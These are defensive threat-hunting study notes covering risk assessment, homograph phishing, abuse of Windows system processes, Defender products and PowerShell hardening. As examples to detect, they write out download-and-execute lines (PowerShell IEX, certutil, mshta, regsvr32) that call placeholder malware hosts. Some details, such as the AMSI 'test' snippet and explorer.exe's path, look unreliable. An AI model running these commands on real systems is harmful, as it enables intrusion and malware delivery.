### **What is Risk Assessment?**  
**Risk Assessment** is the process of identifying, analyzing, and evaluating potential risks to an organization’s assets (data, systems, personnel) to determine their impact and likelihood. It helps prioritize security measures and allocate resources effectively.  
## **Key Components of Risk Assessment**  
### **1. Identify Assets**  
- What needs protection? (e.g., servers, customer data, intellectual property)  
- Example: A company’s database containing user credentials.  

### **2. Identify Threats**  
- What could harm the assets? (e.g., hackers, malware, insider threats, natural disasters)  
- Example: A phishing attack targeting employee credentials.  

### **3. Identify Vulnerabilities**  
- Weaknesses that could be exploited (e.g., unpatched software, weak passwords, misconfigurations)  
- Example: An outdated web server with a known RCE vulnerability.  

### **4. Analyze Likelihood & Impact**  
- **Likelihood:** How probable is the threat? (e.g., frequent phishing attacks)  
- **Impact:** How severe would the damage be? (e.g., data breach leading to regulatory fines)  

| **Risk Level** | **Likelihood** | **Impact** |
| -------------- | -------------- | ---------- |
| **Critical**   | High           | High       |
| **High**       | Medium         | High       |
| **Medium**     | Low            | High       |
| **Low**        | Low            | Low        |

### **5. Risk Evaluation & Prioritization**  
- Which risks are unacceptable? (e.g., unpatched critical servers)  
- Example: A zero-day exploit in a public-facing application is **high risk** and must be patched immediately.  

### **6. Risk Mitigation Strategies**  
- **Avoidance** – Eliminate the risk (e.g., discontinuing a vulnerable service).  
- **Mitigation** – Reduce the risk (e.g., applying patches, using firewalls).  
- **Transfer** – Shift risk (e.g., cybersecurity insurance).  
- **Acceptance** – Acknowledge low-risk issues (e.g., minor software bugs).  

## **Example: Risk Assessment for a Phishing Attack**  
1. **Asset:** Employee email accounts  
2. **Threat:** Phishing campaign stealing credentials  
3. **Vulnerability:** Lack of security awareness training  
4. **Likelihood:** High (phishing is common)  
5. **Impact:** High (data breach, account takeover)  
6. **Risk Level:** **Critical**  
7. **Mitigation:**  
   - Implement **MFA** (Multi-Factor Authentication).  
   - Conduct **phishing simulations & training**.  
   - Deploy **email filtering (Proofpoint, M365 Defender)**.  

---

### **Types of Threat Hunting Teams**  

Threat hunting teams vary in structure and focus, depending on an organization's size, security maturity, and resources. Below is a breakdown of the **three primary types of threat hunting teams**:  


## **1. Ad-Hoc Hunter**  
### **Description:**  
- **Part-time hunters**, usually SOC analysts or incident responders who perform hunting **when time permits**.  
- No formal threat hunting program; hunting is done **reactively** (e.g., after an alert or incident).  
### **Characteristics:**  
✅ **Pros:**  
- Low-cost way to start threat hunting.  
- Leverages existing SOC skills.  
- Good for small organizations with limited resources.  

❌ **Cons:**  
- **Not proactive** (hunting is sporadic).  
- Limited time for deep investigations.  
- May miss advanced threats due to lack of focus.  

### **Example Scenario:**  
- A SOC analyst notices unusual PowerShell activity in logs and decides to investigate further.  


## **2. Analyst and Hunter (Hybrid Role)**  
### **Description:**  
- Security analysts **split time between monitoring alerts and proactive hunting**.  
- More structured than ad-hoc but still not a full-time hunting team.  
- Often seen in **mid-sized organizations** with maturing security programs.  

### **Characteristics:**  
✅ **Pros:**  
- Balances **reactive (SOC) and proactive (hunting)** work.  
- Builds hunting skills across the team.  
- More consistent than ad-hoc hunting.  

❌ **Cons:**  
- Can be **distracted by alerts**, reducing hunting effectiveness.  
- May lack advanced tools/automation for deep hunting.  

### **Example Scenario:**  
- An analyst spends **20% of their time** hunting for signs of **living-off-the-land (LOLBAS) attacks** while handling daily alerts.  


## **3. Dedicated Hunting Team**  
### **Description:**  
- **Full-time threat hunters** focused solely on **proactive detection**.  
- Common in **large enterprises, financial institutions, and government agencies**.  
- Uses **advanced tools** (EDR, SIEM, threat intel) and **custom methodologies**.  

### **Characteristics:**  
✅ **Pros:**  
- **Highly proactive** (constant hunting for stealthy threats).  
- Uses **data science, behavioral analytics, and threat intelligence**.  
- Can uncover **advanced persistent threats (APTs)** before damage occurs.  

❌ **Cons:**  
- **Expensive** (requires skilled hunters and tools).  
- May **overlap with SOC/IR** if not well-coordinated.  

### **Example Scenario:**  
- A team hunts for **C2 (Command & Control) beacons** using **network traffic anomalies** and **memory forensics**.  


---

### **What is Punycode?**  
**Punycode** is a method for converting **Unicode (international) domain names** into an **ASCII-compatible format** (RFC 3492). Since DNS only supports ASCII characters (A-Z, 0-9, hyphens), Punycode allows domains with non-ASCII characters (e.g., Cyrillic, Chinese) to work.  

#### **Example:**  
- **Unicode Domain:** `россия.рф` (Russian)  
- **Punycode:** `xn--h1alffa9f.xn--p1ai`  

#### **Why It Exists?**  
- Enables **Internationalized Domain Names (IDNs)** (e.g., `中国移动.中国`).  
- Ensures compatibility with legacy DNS systems.  


### **What is an IDN Homograph Attack?**  
An **IDN Homograph Attack** (or **Homoglyph Attack**) is a phishing technique where attackers register domains with **visually similar characters** from different scripts to impersonate legitimate websites.  

#### **How It Works?**  
1. **Character Spoofing:**  
   - Replace letters with **look-alike Unicode characters** (e.g., `а` (Cyrillic) vs. `a` (Latin)).  
   - Example:  
     - **Legitimate:** `apple.com`  
     - **Fake:** `аpple.com` (with Cyrillic ‘а’)  

2. **Punycode Obfuscation:**  
   - Browsers display the Unicode version, but the actual domain resolves to Punycode.  
   - Example:  
     - `аррӏе.com` → Punycode: `xn--80ak6aa92e.com`  


### **How Attackers Exploit This?**  
- **Phishing:** Fake login pages mimicking `paypal.com`, `google.com`, etc.  
- **Evading Detection:** Users and filters may miss subtle character differences.  
- **Bypassing Security:** Some email filters and link scanners don’t decode Punycode properly.  


### **Examples of Homograph Attacks**  
| **Real Domain** | **Fake Domain (Homoglyph)**     | **Punycode**         |
| --------------- | ------------------------------- | -------------------- |
| `google.com`    | `ɡoogle.com` (ɡ = small-cap G)  | `xn--oogle-wmc.com`  |
| `apple.com`     | `аррӏе.com` (Cyrillic ‘а’, ‘р’) | `xn--80ak6aa92e.com` |
| `amazon.com`    | `аmаzоn.com` (mixed scripts)    | `xn--mzon-4na5b.com` |


### **How to Detect & Prevent IDN Homograph Attacks?**  
#### **For Users:**  
- **Hover over links** to see the actual URL.  
- **Check for SSL certificates** (but attackers may use free certs like Let’s Encrypt).  
- **Use password managers** (they won’t auto-fill on fake domains).  

#### **For Organizations:**  
- **Browser Protections:**  
  - Chrome/Firefox now show **Punycode for mixed-script domains**.  
  - Example: `xn--google-ssb.com` instead of `ɡoogle.com`.  
- **Email Security:**  
  - Block emails with **Punycode domains** or flag them as suspicious.  
- **Domain Monitoring:**  
  - Register **homograph variants** of your brand (defensive registrations).  

#### **For Developers:**  
- Use **libidn2** or **Unicode normalization** to detect spoofed domains.  

---

### **Types of Threat Hunting Mindsets**  

Threat hunting is a **proactive** approach to identifying hidden threats that evade traditional security tools. The two primary **mindsets** used in threat hunting are:  

1. **Indicator-Based Detection (Intel-Driven Hunting)**  
2. **Anomaly-Based Detection (Hypothesis-Driven Hunting)**  

Let’s break them down with **real-world examples, methodologies, and tools**.  

## **1. Indicator-Based Hunting (Threat Intelligence-Driven)**  
### **Definition:**  
Hunting based on **known IOCs (Indicators of Compromise)** from threat intelligence feeds (e.g., malware hashes, malicious IPs, suspicious domains).  

### **Methodology:**  
- **Collect IOCs** from threat feeds (AlienVault OTX, MITRE ATT&CK, VirusTotal).  
- **Search logs** (SIEM, EDR, Firewall) for matches.  
- **Expand investigation** if a hit is found (e.g., lateral movement, persistence).  

### **Example Scenario:**  
- **Threat Intel Report:** APT29 (Cozy Bear) uses `C:\Windows\Temp\msupdate.exe`.  
- **Hunting Action:**  
  - Query EDR for `msupdate.exe` in `C:\Windows\Temp\`.  
  - Check process lineage (was it spawned by `powershell.exe`?).  


## **2. Anomaly-Based Hunting (Hypothesis-Driven)**  
### **Definition:**  
Hunting for **unusual behavior** (not necessarily linked to known threats) using **baseline comparisons, statistical deviations, and forensic artifacts**.  

### **Methodology:**  
1. **Form a Hypothesis** (e.g., "Attackers may abuse scheduled tasks for persistence").  
2. **Analyze data** (process trees, network traffic, registry changes).  
3. **Identify outliers** (e.g., a `schtasks.exe` creating tasks at 3 AM).  

### **Example Scenario:**  
- **Hypothesis:** "An attacker may use `regsvr32.exe` for LOLBAS execution."  
- **Hunting Action:**  
  - Search for `regsvr32.exe` spawning `cmd.exe`.  
  - Check command lines for `scrobj.dll` (Squiblydoo attack).  


## **Key Differences**  
| **Factor**      | **Indicator-Based Hunting** | **Anomaly-Based Hunting**  |
| --------------- | --------------------------- | -------------------------- |
| **Approach**    | Reactive (IOC matching)     | Proactive (behavioral)     |
| **Data Source** | Threat feeds                | Logs, forensics, baselines |
| **Best For**    | Known malware, APT TTPs     | Zero-days, insider threats |
| **Speed**       | Fast                        | Slower (deep analysis)     |

---

### **Performing Threat Hunts: Two Key Approaches**  

Threat hunting can be conducted in two primary ways:  
1. **Attack-Based Hunting** (Focused on known adversary tactics)  
2. **Analytics-Based Hunting** (Focused on statistical anomalies)  

Let’s break down **how to perform hunts in each style**, with **real-world examples, methodologies, and tools**.  

## **1. Attack-Based Hunting (TTP-Driven)**  
### **Definition:**  
Hunting based on **known adversary Tactics, Techniques, and Procedures (TTPs)** from frameworks like **MITRE ATT&CK**.  

### **When to Use?**  
✔ After a threat intel report on a new attack method (e.g., Log4Shell).  
✔ To check for **specific APT group behaviors** (e.g., Lazarus Group’s macOS malware).  

### **Methodology:**  
1. **Select a TTP** (e.g., "T1059 - Command-Line Interface").  
2. **Form a Hypothesis** (e.g., "Attackers may use PowerShell for lateral movement").  
3. **Query Logs** (EDR, SIEM) for suspicious command executions.  
4. **Investigate Matches** (e.g., `powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"`).  

### **Example Hunts:**  
| **Tactic (MITRE ATT&CK)**        | **Hunting Query**                                              |
| -------------------------------- | -------------------------------------------------------------- |
| **Persistence (T1547.001)**      | Find `Registry Run Keys` modified by non-admin users.          |
| **Lateral Movement (T1021.004)** | Detect `WMI` or `PsExec` spawning `cmd.exe` on multiple hosts. |
| **Defense Evasion (T1070.004)**  | Search for `event logs cleared` via `wevtutil.exe`.            |



## **2. Analytics-Based Hunting (Anomaly-Driven)**  
### **Definition:**  
Hunting for **statistical outliers** (unusual process behavior, network traffic, user activity).  

### **When to Use?**  
✔ When no known IOCs exist (zero-day attacks).  
✔ To detect **insider threats** or **stealthy malware**.  

### **Methodology:**  
1. **Establish a Baseline** (e.g., "Normal working hours: 8 AM–6 PM").  
2. **Identify Deviations** (e.g., "`lsass.exe` memory dump at 3 AM").  
3. **Investigate Anomalies** (e.g., "Why is `svchost.exe` connecting to a Russian IP?").  

### **Example Hunts:**  
| **Anomaly Type**                   | **Hunting Query**                            |
| ---------------------------------- | -------------------------------------------- |
| **Unusual Process Execution Time** | Find `schtasks.exe` running at midnight.     |
| **Rare Parent-Child Process**      | Detect `word.exe` spawning `powershell.exe`. |
| **Abnormal Network Traffic**       | Look for `beaconing` (e.g., DNS tunneling).  |

## **Comparison: Attack-Based vs. Analytics-Based Hunting**  
| **Factor**    | **Attack-Based Hunting** | **Analytics-Based Hunting**  |
| ------------- | ------------------------ | ---------------------------- |
| **Focus**     | Known adversary TTPs     | Statistical anomalies        |
| **Data Used** | Threat intel, IOCs       | Logs, network traffic        |
| **Best For**  | APTs, malware campaigns  | Insider threats, zero-days   |
| **Speed**     | Faster (targeted)        | Slower (investigation-heavy) |

---

### **Threat Hunting Periods: When to Hunt?**  
Threat hunting can be performed at different times depending on the use case:  

1. **Point-in-Time Hunting** (Ad-hoc, targeted investigations)  
2. **Real-Time Hunting** (Continuous, live monitoring)  
3. **Historic Hunting** (Retrospective, forensic analysis)  

Each approach has unique advantages and is suited for different scenarios.  

## **1. Point-in-Time Hunting**  
### **Definition:**  
A **focused, short-duration hunt** triggered by:  
- A new threat intel report (e.g., a critical CVE).  
- A security incident requiring deeper investigation.  

### **When to Use?**  
✔ After a **zero-day disclosure** (e.g., Log4Shell).  
✔ When **IOCs** (Indicators of Compromise) are released.  
✔ For **targeted threat actor tracking** (e.g., APT41 TTPs).  

### **Methodology:**  
1. **Trigger:** External intel or internal alert.  
2. **Scope:** Narrow focus (e.g., "Check for `ProxyShell` exploitation attempts").  
3. **Tools:**  
   - **SIEM** (Splunk, Elastic) – Quick log searches.  
   - **EDR** (CrowdStrike, SentinelOne) – Process/network analysis.  
4. **Outcome:** Confirm/deny compromise and contain threats.  

### **Example:**  
- **Intel:** A new ransomware strain uses `PsExec` for lateral movement.  
- **Hunt:** Search for `PsExec` executions in the last **48 hours**.  

## **2. Real-Time Hunting**  
### **Definition:**  
**Continuous, proactive hunting** using **live data streams** (EDR, NDR, SIEM).  

### **When to Use?**  
✔ For **high-security environments** (banks, govt agencies).  
✔ To catch **in-progress attacks** (e.g., beaconing C2 traffic).  

### **Methodology:**  
1. **Data Sources:**  
   - **Endpoint logs** (process creation, file changes).  
   - **Network traffic** (unusual DNS requests, lateral movement).  
2. **Automation:**  
   - **UEBA** (User Entity Behavior Analytics) flags anomalies.  
   - **EDR alerts** on suspicious behavior (e.g., `lsass.exe` memory dump).  
3. **Response:** Immediate action if malice is confirmed.  

### **Example:**  
- **Anomaly:** `svchost.exe` making HTTP requests to a known C2 IP.  
- **Action:** Isolate host and investigate further.  

## **3. Historic Hunting**  
### **Definition:**  
Analyzing **past data** (days/weeks/months) to uncover **stealthy, long-term compromises**.  

### **When to Use?**  
✔ After a **breach is suspected** (e.g., unusual data exfiltration).  
✔ For **compliance investigations** (e.g., PCI DSS forensic analysis).  

### **Methodology:**  
1. **Timeframe:** Set a window (e.g., "Last 30 days").  
2. **Data Sources:**  
   - **Log archives** (SIEM, firewall logs).  
   - **Disk/memory forensics** (if endpoints are still available).  
3. **Techniques:**  
   - **Timeline analysis** (find first signs of compromise).  
   - **IOC retro-matching** (e.g., "Was this malware hash seen before?").  

### **Example:**  
- **Suspicion:** Data leak from an internal server.  
- **Hunt:** Review **all RDP/VPN logs** for unusual access patterns.  

## **Comparison Table**  
| **Factor**          | **Point-in-Time** | **Real-Time**       | **Historic**        |  
|---------------------|------------------|---------------------|---------------------|  
| **Timeframe**       | Hours/days       | Live                | Days/months         |  
| **Best For**        | Known threats    | Active attacks      | Stealthy breaches   |  
| **Data Needed**     | Recent logs      | Live telemetry      | Archived logs       |  
| **Speed**          | Fast             | Immediate           | Slow                |  

---

## **1. `svchost.exe` (Service Host)**
### **Legitimate Behavior:**
- **Location:** `C:\Windows\System32\svchost.exe`  
- **Purpose:** Hosts multiple Windows services (e.g., `wuauserv` for Windows Update, `BITS` for background transfers).  
- **Multiple Instances:** Normal (each `svchost.exe` runs under a different service group).  
- **Parent Process:** `services.exe`  

### **Malicious Abuse:**
- **Process Hollowing:** Malware injects malicious code into a legitimate `svchost.exe` process.  
- **Suspicious Services:** Attackers create malicious services that run under `svchost.exe`.  
- **Command-Line Anomalies:** Unusual `-k` parameters (e.g., `-k malwaregroup`).  

### **Detection:**
✅ **Check:**  
- `tasklist /svc` (Lists services running under `svchost.exe`)  
- **Process Explorer** (Verify DLLs loaded)  
- **Autoruns** (Check for rogue services)  

🔴 **Red Flags:**  
- `svchost.exe` running from `Temp`, `AppData`, or non-`System32`.  
- High network activity to unknown IPs.  

---

## **2. `explorer.exe` (Windows Explorer)**
### **Legitimate Behavior:**
- **Location:** `C:\Windows\explorer.exe`  
- **Purpose:** Manages GUI (desktop, taskbar, file browsing).  
- **Parent Process:** `userinit.exe` (after login).  

### **Malicious Abuse:**
- **DLL Injection:** Malware injects malicious DLLs into `explorer.exe` for persistence.  
- **Process Spoofing:** Fake `explorer.exe` in `Downloads` or `Temp`.  
- **Suspicious Child Processes:** `cmd.exe` or `powershell.exe` spawned from `explorer.exe`.  

### **Detection:**
✅ **Check:**  
- **Process Hacker** (Check loaded modules)  
- **Command Line:** Legitimate: `explorer.exe` | Malicious: `explorer.exe C:\malware\payload.dll`  

🔴 **Red Flags:**  
- `explorer.exe` running from a non-standard path.  
- Unusual network connections.  

---

## **3. `lsass.exe` (Local Security Authority Subsystem Service)**
### **Legitimate Behavior:**
- **Location:** `C:\Windows\System32\lsass.exe`  
- **Purpose:** Handles authentication (NTLM, Kerberos).  
- **Parent Process:** `wininit.exe`  

### **Malicious Abuse:**
- **Credential Dumping:** Tools like **Mimikatz** extract passwords from `lsass.exe` memory.  
- **Process Injection:** Malware injects into `lsass.exe` to steal hashes.  

### **Detection:**
✅ **Check:**  
- **Windows Event Logs** (Event ID **4624** for logons, **4688** for process creation).  
- **Sysmon** (Rule: `lsass.exe` accessed by non-system processes).  

🔴 **Red Flags:**  
- `rundll32.exe` or `powershell.exe` accessing `lsass.exe`.  
- **Unexpected memory reads** (use **Process Monitor**).  

---

## **4. `winlogon.exe` (Windows Logon Application)**
### **Legitimate Behavior:**
- **Location:** `C:\Windows\System32\winlogon.exe`  
- **Purpose:** Manages login/logoff processes.  
- **Parent Process:** `smss.exe`  

### **Malicious Abuse:**
- **Malware Persistence:** Malicious DLLs injected via `winlogon.exe`.  
- **Sticky Key Backdoor:** Replacing `sethc.exe` (sticky keys) with `cmd.exe`.  

### **Detection:**
✅ **Check:**  
- **Autoruns** (Verify shell extensions).  
- **Process Explorer** (Check child processes).  

🔴 **Red Flags:**  
- `winlogon.exe` spawning `cmd.exe` or `powershell.exe`.  

---

## **5. `csrss.exe` (Client/Server Runtime Subsystem)**
### **Legitimate Behavior:**
- **Location:** `C:\Windows\System32\csrss.exe`  
- **Purpose:** Manages Win32 console & shutdown processes.  
- **Parent Process:** `smss.exe`  

### **Malicious Abuse:**
- **Rarely Targeted:** Critical system process; crashes can cause a **BSOD**.  
- **Code Injection:** Advanced malware may inject into `csrss.exe`.  

### **Detection:**
✅ **Check:**  
- **Process Explorer** (Verify signature & path).  

🔴 **Red Flags:**  
- `csrss.exe` running from `Temp` or `AppData`.  

---

## **6. `rundll32.exe` (Runs DLLs as Applications)**
### **Legitimate Behavior:**
- **Location:** `C:\Windows\System32\rundll32.exe`  
- **Purpose:** Executes DLL functions (e.g., `rundll32.exe user32.dll,LockWorkStation`).  

### **Malicious Abuse:**
- **Malicious DLL Execution:**  
  - `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ..."` (APT attacks).  
  - `rundll32.exe C:\malware\payload.dll,Start`  

### **Detection:**
✅ **Check:**  
- **Command-Line Analysis** (Legitimate: `user32.dll` | Malicious: `malware.dll`).  
- **DLL Loaded from `AppData` or `Temp`.**  

🔴 **Red Flags:**  
- `rundll32.exe` running from non-`System32`.  

---

## **7. `powershell.exe` / `cmd.exe`**
### **Legitimate Behavior:**
- **Location:** `C:\Windows\System32\`  
- **Purpose:** Script execution, automation.  

### **Malicious Abuse:**
- **Obfuscated Commands:**  
  - `powershell -e JABzAD0AJwB3AGkAbgAzADIAJwA7...` (Base64-encoded payload).  
  - `cmd.exe /c certutil -urlcache -split -f http://malware.com/backdoor.exe`  

### **Detection:**
✅ **Check:**  
- **Command-Line Logging** (Enable **PowerShell Script Block Logging**).  
- **Sysmon Event ID 1** (Process creation).  

🔴 **Red Flags:**  
- Long, encoded commands.  
- `cmd.exe` spawning from `msiexec.exe` or `word.exe`.  

---

## **8. `mshta.exe` (Executes HTA Files)**
### **Legitimate Behavior:**
- **Location:** `C:\Windows\System32\mshta.exe`  
- **Purpose:** Runs `.hta` (HTML Application) files.  

### **Malicious Abuse:**
- **Malicious HTA Execution:**  
  - `mshta.exe http://malware.com/payload.hta`  
  - Used in **phishing & drive-by downloads**.  

### **Detection:**
✅ **Check:**  
- **Process Explorer** (Check parent process).  
- **Network Connections** (HTA fetching external payloads).  

🔴 **Red Flags:**  
- `mshta.exe` running from `Outlook.exe` or `chrome.exe`.  

---

## **9. `wscript.exe` / `cscript.exe` (Windows Script Host)**
### **Legitimate Behavior:**
- **Location:** `C:\Windows\System32\`  
- **Purpose:** Runs `.vbs`, `.js` scripts.  

### **Malicious Abuse:**
- **Malicious Script Execution:**  
  - `wscript.exe C:\malware\payload.vbs`  
  - **Obfuscated JS/VBS scripts.**  

### **Detection:**
✅ **Check:**  
- **Script Content Analysis** (Use **VirusTotal**).  
- **Parent Process** (Legitimate: `explorer.exe` | Malicious: `word.exe`).  

🔴 **Red Flags:**  
- Scripts from `Temp` or `Downloads`.  

---

## **10. `regsvr32.exe` (Registers DLLs)**
### **Legitimate Behavior:**
- **Location:** `C:\Windows\System32\regsvr32.exe`  
- **Purpose:** Registers/unregisters DLLs.  

### **Malicious Abuse:**
- **Squiblydoo Attack:**  
  - `regsvr32 /s /n /u /i:http://malware.com/payload.sct scrobj.dll`  
  - Executes remote scripts.  

### **Detection:**
✅ **Check:**  
- **Command-Line Arguments** (Legitimate: `/s filename.dll` | Malicious: `/i:http://...`).  

🔴 **Red Flags:**  
- `regsvr32.exe` loading scripts from the web.  

## **Summary Table: Legitimate vs. Malicious Indicators**
| **Process**       | **Legitimate** | **Malicious** |
|-------------------|---------------|---------------|
| **`svchost.exe`** | Multiple instances, signed, `System32` | Non-`System32`, unusual `-k` parameter |
| **`explorer.exe`** | Runs from `System32`, no network calls | Spawns `cmd.exe`, runs from `Temp` |
| **`lsass.exe`**   | Runs under `wininit.exe` | Accessed by `mimikatz.exe` |
| **`rundll32.exe`** | Runs signed DLLs | Runs from `AppData`, malicious DLLs |
| **`powershell.exe`** | Clean commands | Obfuscated, encoded scripts |
| **`mshta.exe`**   | Rarely used | Runs remote HTA files |
| **`wscript.exe`**  | Runs `.vbs` scripts | Executes obfuscated JS/VBS |
| **`regsvr32.exe`** | Registers DLLs | Executes remote `.sct` files |

### **Final Tips for SOC Analysts**
1. **Enable Detailed Logging** (Sysmon, PowerShell logging).  
2. **Use EDR Tools** (CrowdStrike, SentinelOne) for behavioral detection.  
3. **Cross-Check with Threat Intel** (VirusTotal, ANY.RUN).  
4. **Look for LOLBAS Abuse** (Living-off-the-land binaries).  

---

### **Windows Defender Advanced Threat Protection (ATP) – Now Microsoft Defender for Endpoint**  
**Definition:**  
Microsoft Defender ATP (now rebranded as **Microsoft Defender for Endpoint**) is an **enterprise-grade EDR (Endpoint Detection and Response)** solution that provides:  
- **Threat prevention** (next-gen AV).  
- **Post-breach detection** (behavioral analytics).  
- **Automated investigation & remediation** (AI-driven).  

#### **Key Features:**  
1. **Attack Surface Reduction (ASR)**  
   - Blocks exploit techniques (e.g., macro malware, LSASS dumping).  
2. **Endpoint Detection & Response (EDR)**  
   - Records process trees, file changes, and network connections for forensic analysis.  
3. **Threat & Vulnerability Management (TVM)**  
   - Identifies unpatched software/misconfigurations (e.g., missing KBs).  
4. **Microsoft Threat Experts (MTE)**  
   - 24/7 SOC-like monitoring by Microsoft’s security team.  

#### **How It Works?**  
- **Sensors** on endpoints send telemetry to the **Microsoft Defender Security Center**.  
- Uses **AI + cloud analytics** to detect ransomware, fileless malware, and zero-days.  

#### **Example Use Case:**  
- Detects **Mimikatz** activity via LSASS memory access and kills the malicious process.  

---

### **Microsoft Advanced Threat Analytics (ATA) – Now Part of Microsoft Defender for Identity**  
**Definition:**  
Microsoft ATA (now integrated into **Microsoft Defender for Identity**) is an **on-premises security solution** that monitors **Active Directory (AD)** traffic to detect:  
- **Pass-the-Hash (PtH)** attacks.  
- **Golden Ticket** attacks.  
- **Lateral movement** via SMB/WMI.  

#### **Key Features:**  
1. **Behavioral Analytics**  
   - Learns normal AD behavior and flags anomalies (e.g., unusual Kerberos requests).  
2. **Real-Time Alerts**  
   - Alerts on **reconnaissance** (e.g., excessive failed logins).  
3. **Integration with SIEM/SOC**  
   - Sends alerts to Azure Sentinel or Splunk.  

#### **How It Works?**  
- **ATA Gateway** analyzes AD traffic (LDAP, DNS, Kerberos).  
- **Detects malicious patterns** like DCShadow attacks.  

#### **Example Use Case:**  
- Flags a **Pass-the-Ticket attack** where an attacker reuses a stolen Kerberos ticket.  

---

### **Comparison: Defender ATP vs. ATA**  
| **Feature**               | **Microsoft Defender for Endpoint (ATP)** | **Microsoft Defender for Identity (ATA)** |  
|---------------------------|------------------------------------------|------------------------------------------|  
| **Scope**                 | Endpoints (Windows, macOS, Linux)        | Active Directory / Identity              |  
| **Deployment**            | Cloud-based (with on-prem options)       | On-premises (now cloud-integrated)       |  
| **Primary Use Case**      | Malware, ransomware, zero-days          | AD attacks (Kerberos, NTLM exploits)     |  
| **Detection Focus**       | Process behavior, fileless malware       | Lateral movement, credential theft       |  

---

### **How They Work Together?**  
1. **Defender for Endpoint** catches malware on a workstation.  
2. **Defender for Identity** detects the attacker moving laterally via AD.  
3. **Azure Sentinel** (SIEM) correlates both alerts for a full kill-chain view.  

---

### **PowerShell Defenses: Securing Against Malicious Scripts**  
PowerShell is a powerful tool for administrators but is frequently abused by attackers. Here are **three key defenses** to mitigate PowerShell-based attacks:  


## **1. System-Wide PowerShell Transcription**  
### **What It Does?**  
- Logs **all PowerShell commands** executed on a system to a transcript file.  
- Helps in **forensic investigations** by recording attacker activity.  

### **How to Enable?**  
```powershell
# Enable transcription for all users
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value "C:\PS_Logs"
```
**Logs Include:**  
✔ User who ran the command.  
✔ Command executed.  
✔ Timestamp.  

### **Pros & Cons:**  
| ✅ **Pros** | ❌ **Cons** |  
|------------|------------|  
| Helps in **incident response** | Does **not block** malicious scripts |  
| Detects **living-off-the-land (LOLBAS)** attacks | Logs can be **deleted by attackers** |  


## **2. Constrained Language Mode**  
### **What It Does?**  
- Restricts PowerShell to **safe language constructs**, blocking:  
  - **Reflection** (used in exploits).  
  - **COM objects** (used in weaponized scripts).  
  - **Add-Type** (compiling malicious code).  

### **How to Enable?**  
#### **Method 1: Via GPO**  
1. `gpedit.msc` → **Computer Config** → **Administrative Templates** → **Windows Components** → **PowerShell**.  
2. Enable **"Turn on Script Block Logging"** and **"Use Constrained Language Mode"**.  

#### **Method 2: Registry Key**  
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name "__PSLockdownPolicy" -Value "4"
```
**Impact:**  
- Malicious scripts like **Mimikatz.ps1** will **fail to execute**.  

### **Pros & Cons:**  
| ✅ **Pros**                              | ❌ **Cons**                             |
| --------------------------------------- | -------------------------------------- |
| Blocks **many fileless attacks**        | May break **legitimate admin scripts** |
| Hardens against **PowerShell exploits** | Requires **testing before deployment** |

---

## **3. AMSI (Anti-Malware Scan Interface)**  
### **What It Does?**  
- **Scans PowerShell scripts in memory** before execution.  
- Works with **Windows Defender** and **3rd-party AV** to detect obfuscated malware.  

### **How It Works?**  
1. When PowerShell runs a script, **AMSI intercepts it**.  
2. Sends the script to **installed AV** for analysis.  
3. Blocks execution if flagged as malicious.  

### **Example Attack Prevention:**  
- Blocks **obfuscated PowerShell** like:  
```powershell
$encoded = "JABzAD0AJwB3AGkAbgAzADIAJwA7..."
Invoke-Expression $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)))
```

### **How to Verify AMSI is Working?**  
```powershell
# Test AMSI integration (should return "AMSI result is clean")
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetMethod('ScanContent').Invoke($null, @("AMSI Test", "EICAR"))
```

### **Pros & Cons:**  
| ✅ **Pros**                     | ❌ **Cons**                                |
| ------------------------------ | ----------------------------------------- |
| Catches **obfuscated scripts** | Can be **bypassed** (e.g., AMSI patching) |
| Works with **multiple AVs**    | Requires **updated AV signatures**        |

---

### **PowerShell Threat Hunting Tools**  
PowerShell is widely used by attackers, making it critical for defenders to have specialized tools for **incident response (IR)** and **threat hunting (TH)**. Below are three key PowerShell-based tools: 

## **1. Kansa**  
### **Purpose:**  
- **Incident Response (IR) Framework** for **data collection** from Windows systems.  
- Focuses on **rapid triage** during security investigations.  

### **Key Features:**  
✔ **Modular design** (easy to extend with custom scripts).  
✔ **Collects critical forensic artifacts**:  
  - Process listings (`Get-Process`).  
  - Network connections (`netstat -ano`).  
  - Scheduled tasks (`Get-ScheduledTask`).  
  - Event logs (`Get-WinEvent`).  
✔ **Outputs to CSV/JSON** for analysis in SIEMs like Splunk.  

### **Example Command:**  
```powershell
.\Kansa.ps1 -Target $Computer -ModulePath .\Modules\Disk
```
**Use Case:**  
- After detecting a breach, quickly gather **process, network, and log data** from multiple hosts.  

### **Pros & Cons:**  
| ✅ **Pros** | ❌ **Cons** |  
|------------|------------|  
| **Fast, lightweight data collection** | **No built-in analysis** (just collects data) |  
| **Open-source & customizable** | Requires **PowerShell remoting (WinRM)** |  

---

## **2. NOAH (Network Observability and Anomaly Hunting)**  
### **Purpose:**  
- **PowerShell-based IR framework** for **network anomaly detection**.  
- Helps detect **C2 traffic, lateral movement, and data exfiltration**.  

### **Key Features:**  
✔ **Analyzes NetFlow/PCAP data** (via PowerShell).  
✔ **Detects suspicious connections**:  
  - Beaconing (regular callbacks to C2).  
  - Unusual protocol usage (e.g., DNS tunneling).  
✔ **Integrates with SIEMs** (Splunk, ELK).  

### **Example Command:**  
```powershell
Import-Module .\NOAH.psm1  
Find-Beacons -Data .\netflow.csv -Threshold 5
```
**Use Case:**  
- Hunt for **APT C2 channels** in network traffic logs.  

### **Pros & Cons:**  
| ✅ **Pros**                          | ❌ **Cons**                                           |
| ----------------------------------- | ---------------------------------------------------- |
| **Specialized for network hunting** | Limited to **network data** (not endpoint forensics) |
| **Works with raw PCAPs**            | Requires **pre-processed data**                      |

---

## **3. PSHunt**  
### **Purpose:**  
- **Threat Hunting Module** for **scanning endpoints for IOCs (Indicators of Compromise)**.  
- Designed for **proactive hunting** (not just IR).  

### **Key Features:**  
✔ **Scans for known malware hashes, suspicious processes, and registry keys**.  
✔ **Detects common attack techniques**:  
  - **LSASS dumping** (Mimikatz).  
